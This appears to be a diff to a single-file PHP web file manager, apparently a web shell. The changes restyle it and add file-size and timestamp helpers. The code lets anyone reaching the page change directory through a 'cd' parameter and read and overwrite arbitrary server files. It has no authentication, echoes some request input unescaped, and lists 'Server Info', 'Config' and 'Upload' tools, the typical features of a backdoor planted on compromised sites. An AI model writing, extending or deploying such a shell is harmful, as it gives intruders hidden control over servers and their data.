@@ -1,4 +1,4 @@
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
 <style type="text/css">
 	@import url('https://fonts.googleapis.com/css2?family=MuseoModerno&display=swap');
@@ -49,18 +49,22 @@
 		padding: 7px;
 	}
 	div.dir, div.file {
-		padding:2px;
+		padding:1px;
 
 	}
 	div.info {
 		display: inline-block;
 		width:100px;
+		padding:3px;
 		float: right;
 		text-align: center;
 	}
 	select {
+		background:#f2f2f2;
+		border-radius:4px;
+		border: 1px solid #e6e6e6;
+		outline: none;
 		font-family: 'MuseoModerno', cursive;
-		padding:3px;
 		width:100%;
 	}
 	div.edit {
@@ -74,6 +78,10 @@
 		height:300px;
 		border-radius:5px;
 	}
+	td.action {
+		text-align: center;
+		font-size:25px;
+	}
 	input[type=submit] {
 		font-family: 'MuseoModerno', cursive;
 		width:100%;
@@ -83,6 +91,7 @@
 		padding:7px;
 	}
 	.icons {
+		margin-top:5px;
         width:24px;
         height:24px;
     }
@@ -100,6 +109,43 @@
 	}
 	::-webkit-scrollbar-thumb:hover {
   		background: none; 
+	}
+	td.img {
+		width:30px;
+	}
+	td.act {
+		width:10%;
+	}
+	textarea::placeholder {
+		color: red;
+		opacity: 1;
+	}
+	textarea:-ms-input-placeholder {
+  		color: red;
+	}
+	textarea::-ms-input-placeholder {
+  		color: red;
+	}
+	@media (min-width: 320px) and (max-width: 480px) {
+		div.container {
+			margin: 0;
+			width:121%;
+		}
+		div.tool, .size, .perms {
+			display: none;
+		}
+		td.act {
+			width:13%;
+
+		}
+		select {
+  			-moz-appearance: none;
+  			-webkit-appearance: none;
+  			padding: 2px 2px;
+		}
+		div.center {
+			height:420px;
+		}
 	}
 </style>
 <center>
@@ -134,7 +180,7 @@ class x {
 					if (!is_file($file['name'])) continue 2;
 					break;
 			}
-			$file['size'] 	= (is_dir($file['name'])) ? filetype($file['name']) : filesize($file['name']);
+			$file['size'] 	= (is_dir($file['name'])) ? @filetype($file['name']) : x::size($file['name']);
 			$file['perms'] 	= x::w__($file['name'], x::perms($file['name'])); 
 			$result[] = $file;
 		} return $result;
@@ -175,12 +221,35 @@ class x {
                 break;
         }
     }
+    public static function ftime($filename) {
+        return date("F d Y g:i:s", filemtime($filename));
+    }
+    public static function sortname($filename) {
+    	return substr(htmlspecialchars($filename), 0, 28).'...';
+    }
+    public static function size($filename) {
+        if (is_file($filename)) {
+            $filepath = $filename;
+            if (!realpath($filepath)) {
+                $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
+            }
+            $filesize = filesize($filepath);
+            $array = array("TB","GB","MB","KB","B");
+            $total = count($array);
+            while ($total-- && $filesize > 1024) {
+                $filesize /= 1024;
+            } return round($filesize, 2) . " " . $array[$total];
+        } return false;
+    }
 }
 ?>
 <div class="row">
 <div class="col-xs-2 tool">
 	<a href="#">Server Info</a>
 	<a href="#">Config</a>
+	<a href="#">Upload</a>
+	<a href="#">Create FIle</a>
+	<a href="#">Replace File</a>
 </div>
 <div class="col-xs-10 center">
 <?php
@@ -196,63 +265,116 @@ switch (@$_POST['action']) {
 		?>
 		<form method="post">
 		<div class="edit">
-			<div class="filename">
-				Filename : <?= basename($_POST['file']) ?>
-			</div>
-			<div class="textarea">
-				<textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
-			</div>
-			<div class="submit">
-				<input type="submit" name="edit" value="SAVE">
-				<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
-				<input type="hidden" name="action" value="edit">
-			</div>
+			<table width='100%'>
+				<tr>
+					<td>
+						<a href="?cd=<?= $_GET['cd'] ?>">
+							<img class="icons" src="https://mlisi.xyz/img/shademe.png">
+						</a>
+					</td>
+					<td class="action" colspan="2">EDIT</td>
+				</tr>
+				<tr>
+					<td style="width:120px;">
+						Filename
+					</td>
+					<td>:</td>
+					<td>
+						<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
+					</td>
+				</tr>
+				<tr>
+					<td style="width:120px;">
+						Size
+					</td>
+					<td>:</td>
+					<td>
+						<?= filesize($_POST['file']) ?>
+					</td>
+				</tr>
+				<tr>
+					<td style="width:120px;">
+						Last Modif
+					</td>
+					<td>:</td>
+					<td>
+						<?= x::ftime($_POST['file']) ?>
+					</td>
+				</tr>
+				<tr>
+					<td colspan="3">
+						<textarea name="data" placeholder="not writable"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
+					</td>
+				</tr>
+				<tr>
+					<td colspan="3">
+						<input type="submit" name="edit" value="SAVE">
+						<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+						<input type="hidden" name="action" value="edit">
+					</td>
+				</tr>
+			</table>
 		</div>
 		</form>
 		<?php
 		exit();
 		break;
-	
-	default:
-		# code...
-		break;
 }
 if (isset($_GET['cd'])) {
 	x::cd($_GET['cd']);
 }
+?> <table width="100%"> <?php
 foreach (x::files('dir') as $key => $dir) { ?>
 	<form method="post" action="?cd=<?= x::cwd() ?>">
-		<div class="dir">
-			<a href="?cd=<?= $dir['name'] ?>"><?= basename($dir['name']) ?></a>
-				<div class="info">
-					<select name="action" onchange="if(this.value != '0') this.form.submit()">
-						<option selected disabled>action</option>
-					</select>
-					<input type="hidden" name="file" value="<?= $dir['name'] ?>">
-				</div>
-			<div class="info"><?= $dir['perms'] ?></div>
-			<div class="info"><?= $dir['size'] ?></div>
-		</div>
+		<tr>
+			<td class="img">
+				<img class="icons" src="https://image.flaticon.com/icons/svg/716/716784.svg">
+			</td>
+			<td>
+				<a href="?cd=<?= $dir['name'] ?>"><?= basename($dir['name']) ?></a>
+			</td>
+			<td class="size">
+				<?= $dir['size'] ?>
+			</td>
+			<td class="perms">
+				<?= $dir['perms'] ?>
+			</td>
+			<td class="act">
+				<select name="action" onchange="if(this.value != '0') this.form.submit()">
+					<option selected disabled>action</option>
+				</select>
+				<input type="hidden" name="file" value="<?= $dir['name'] ?>">
+			</td>
+		</tr>
 	</form>
 <?php }
 foreach (x::files('file') as $key => $file) { ?>
 	<form method="post" action="?cd=<?= x::cwd() ?>">
-		<div class="file">
-			<img class="icons" src="<?= x::getimg($file['name']) ?>">&nbsp;&nbsp;
-			<?= basename($file['name']) ?>
-				<div class="info">
-					<select name="action" onchange="if(this.value != '0') this.form.submit()">
+		<tr>
+			<td>
+				<img class="icons" src="<?= x::getimg($file['name']) ?>">
+			</td>
+			<td>
+				<?= x::sortname(basename($file['name'])) ?>
+			</td>
+			<td class="size">
+				<?= $file['size'] ?>
+			</td>
+			<td class="perms">
+				<?= $file['perms'] ?>
+			</td>
+			<td>
+				<select name="action" onchange="if(this.value != '0') this.form.submit()">
 						<option selected disabled>action</option>
 						<option value="edit">edit</option>
-					</select>
-					<input type="hidden" name="file" value="<?= $file['name'] ?>">
-				</div>
-			<div class="info"><?= $file['perms'] ?></div>
-			<div class="info"><?= $file['size'] ?></div>
-		</div>
+				</select>
+				<input type="hidden" name="file" value="<?= $file['name'] ?>">
+			</td>
+		</tr>
 	</form>
 <?php }
 ?>
+</table>
 </div>
 </div>
 </div>
